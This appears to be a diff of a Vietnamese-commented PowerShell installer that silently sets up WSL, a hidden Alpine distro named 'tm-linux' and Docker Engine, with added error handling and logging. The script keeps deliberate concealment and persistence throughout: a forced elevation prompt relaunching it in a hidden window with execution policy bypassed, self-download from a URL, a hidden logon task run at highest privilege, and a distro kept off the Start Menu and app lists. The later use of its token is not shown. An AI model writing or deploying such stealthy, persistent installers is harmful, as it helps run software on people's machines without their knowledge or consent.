@@ -29,12 +29,20 @@ Log "=== Bat dau (Docker Engine trong WSL - KHONG Docker Desktop) ==="
 
 $ThisScript = if ($PSCommandPath) { $PSCommandPath } else { $SelfPath }
 if ($PSCommandPath) { try { Unblock-File $PSCommandPath } catch {} }
+Log ("He dieu hanh: " + [System.Environment]::OSVersion.VersionString)
 
-$IsAdmin = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
+$IsAdmin = $false
+try {
+  $IsAdmin = ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)
+} catch {
+  $IsAdmin = ($env:USER -eq 'root')
+}
 if (-not $IsAdmin) {
   Log 'Khong co quyen admin - tu dong ep RunAs (UAC)'
   if ($PSCommandPath) {
-    Start-Process powershell.exe -Verb RunAs -WindowStyle Hidden -ArgumentList "-NoProfile -ExecutionPolicy Bypass -File `"$PSCommandPath`" skip"
+    try {
+      Start-Process powershell.exe -Verb RunAs -WindowStyle Hidden -ArgumentList "-NoProfile -ExecutionPolicy Bypass -File `"$PSCommandPath`" skip"
+    } catch { Log "UAC bi tu choi hoac khong tu-nang-quyen duoc: $($_.Exception.Message)" }
   } else {
     try {
       Invoke-WebRequest -Uri $SelfUrl -OutFile $SelfPath -UseBasicParsing
@@ -48,13 +56,22 @@ if (-not $IsAdmin) {
 if (-not $Token -or $Token -eq 'DAN_TOKEN_CUA_BAN_VAO_DAY') { exit 1 }
 
 function Set-ResumeTask {
-  $a = New-ScheduledTaskAction -Execute 'powershell.exe' -Argument "-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File `"$ThisScript`" skip"
-  $t = New-ScheduledTaskTrigger -AtLogOn
-  $p = New-ScheduledTaskPrincipal -UserId $env:USERNAME -RunLevel Highest
-  Register-ScheduledTask -TaskName $TaskName -Action $a -Trigger $t -Principal $p -Force | Out-Null
+  try {
+    $a = New-ScheduledTaskAction -Execute 'powershell.exe' -Argument "-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File `"$ThisScript`" skip"
+    $t = New-ScheduledTaskTrigger -AtLogOn
+    $p = New-ScheduledTaskPrincipal -UserId $env:USERNAME -RunLevel Highest
+    Register-ScheduledTask -TaskName $TaskName -Action $a -Trigger $t -Principal $p -Force | Out-Null
+    Log "Da dang ky task '$TaskName' tu chay khi dang nhap"
+  } catch { Log "Khong dang ky duoc task resume: $($_.Exception.Message)" }
 }
 
 function Wsh($cmd) { & wsl.exe -d $DistroName -u root -- sh -c $cmd }
+function DistroOK {
+  try {
+    & wsl.exe -d $DistroName -u root -- echo DISTROOK *> $null
+    return ($LASTEXITCODE -eq 0)
+  } catch { return $false }
+}
 function DockerUp {
   $r = Wsh 'docker info >/dev/null 2>&1 && echo DOCKOK'
   return ("$r" -match 'DOCKOK')
@@ -94,9 +111,11 @@ try {
 } catch {}
 if (-not $HasWsl) {
   Log 'Chua co WSL - cai WSL ngam (khong distro, khong mo cua so)'
-  & wsl.exe --install --no-distribution --no-launch *> $null
+  try { & wsl.exe --install --no-distribution --no-launch *> $null } catch { Log "LOI wsl --install: $($_.Exception.Message)" }
   if ($LASTEXITCODE -ne 0) {
-    & wsl.exe --install --no-distribution *> $null
+    Log "wsl --install --no-distribution --no-launch khong thanh cong (exit $LASTEXITCODE) - thu kieu cu"
+    try { & wsl.exe --install --no-distribution *> $null } catch {}
+    Log "wsl --install --no-distribution ket thuc (exit $LASTEXITCODE)"
     Start-Sleep -Seconds 15
     Get-Process wslsettings -ErrorAction SilentlyContinue | Stop-Process -Force -ErrorAction SilentlyContinue
   }
@@ -114,18 +133,18 @@ if (-not $HasWsl) {
 Log 'WSL san sang'
 
 # === Buoc 2: distro tm-linux (import thu cong - KHONG xuat hien trong Start Menu / danh sach app / recent) ===
-$list = ''
-try { $list = (& wsl.exe --list --quiet 2>$null | Out-String) -replace "`0", '' } catch {}
-$HasDistro = ($list -match [regex]::Escape($DistroName))
-if (-not $HasDistro) {
-  Log 'Tai Alpine minirootfs (~4MB)...'
+if (-not (DistroOK)) {
+  Log 'Distro chua co hoac chua chay duoc - tai rootfs va import...'
   $ProgressPreference = 'SilentlyContinue'
   $tar = Join-Path $env:TEMP 'alpine-rootfs.tar.gz'
   $ok = $false
-  try {
-    Invoke-WebRequest -Uri $RootFsPrimary -OutFile $tar -UseBasicParsing -TimeoutSec 600
-    $ok = $true
-  } catch {}
+  foreach ($u in @($RootFsPrimary, $RootFsPrimary)) {
+    try {
+      Invoke-WebRequest -Uri $u -OutFile $tar -UseBasicParsing -TimeoutSec 600
+      $ok = $true
+      break
+    } catch { Log "Loi tai rootfs tu $u : $($_.Exception.Message)" }
+  }
   if (-not $ok) {
     try {
       $html = (Invoke-WebRequest -Uri $RootFsList -UseBasicParsing).Content
@@ -139,18 +158,39 @@ if (-not $HasDistro) {
   if (-not $ok -or -not (Test-Path $tar)) { Log 'LOI: khong tai duoc rootfs - dang ky resume roi thoat'; Set-ResumeTask; exit 3 }
   New-Item -ItemType Directory -Force -Path $WslDir | Out-Null
   Log 'Import distro vao WSL (an hoan toan khoi giao dien)...'
-  & wsl.exe --import $DistroName $WslDir $tar *> $null
+  $impOut = (& wsl.exe --import $DistroName $WslDir $tar 2>&1 | Out-String)
+  $impCode = $LASTEXITCODE
   Remove-Item $tar -Force -ErrorAction SilentlyContinue
-  Log "Da import $DistroName"
+  if ($impCode -ne 0) {
+    Log "LOI IMPORT (exit $impCode): $($impOut.Trim())"
+    Set-ResumeTask
+    exit 3
+  }
+  Start-Sleep -Seconds 3
+  if (-not (DistroOK)) {
+    Log 'LOI: da import nhung distro khong chay duoc - thuong do thieu ao hoa (bat VT-x/AMD-V; tren VM VirtualBox phai bat Nested VT-x). Thu chay: wsl --update'
+    Set-ResumeTask
+    exit 3
+  }
+  Log "Da import va chay duoc $DistroName"
+} else {
+  Log 'Distro da ton tai - bo qua import'
 }
 
 # === Buoc 3: Docker Engine trong distro (lan dau ~150MB, chay ngam) ===
 $chk = Wsh 'apk info -e docker >/dev/null 2>&1 && echo PKGOK'
 if ("$chk" -notmatch 'PKGOK') {
   Log 'Cai Docker Engine trong WSL (~150MB, mat vai phut, chay ngam)...'
-  Wsh ("printf 'https://dl-cdn.alpinelinux.org/alpine/$ApkBranch/main\nhttps://dl-cdn.alpinelinux.org/alpine/$ApkBranch/community\n' > /etc/apk/repositories && apk update >/dev/null 2>&1 && apk add --no-progress docker >/dev/null 2>&1 && echo APKOK") | Out-Null
+  $apkLog = Join-Path $Dir 'apk_install.log'
+  $r = Wsh ("printf 'https://dl-cdn.alpinelinux.org/alpine/$ApkBranch/main\nhttps://dl-cdn.alpinelinux.org/alpine/$ApkBranch/community\n' > /etc/apk/repositories && apk update && apk add --no-progress docker")
+  try { $r | Add-Content -Path $apkLog } catch {}
   $chk = Wsh 'apk info -e docker >/dev/null 2>&1 && echo PKGOK'
-  if ("$chk" -notmatch 'PKGOK') { Log 'LOI: cai Docker Engine that bai - dang ky resume roi thoat'; Set-ResumeTask; exit 4 }
+  if ("$chk" -notmatch 'PKGOK') {
+    Log "LOI: cai Docker Engine that bai - chi tiet trong $apkLog, 10 dong cuoi:"
+    try { Get-Content $apkLog -Tail 10 | ForEach-Object { Log "    $_" } } catch {}
+    Set-ResumeTask
+    exit 4
+  }
   Log 'Docker Engine da cai xong'
 }
 
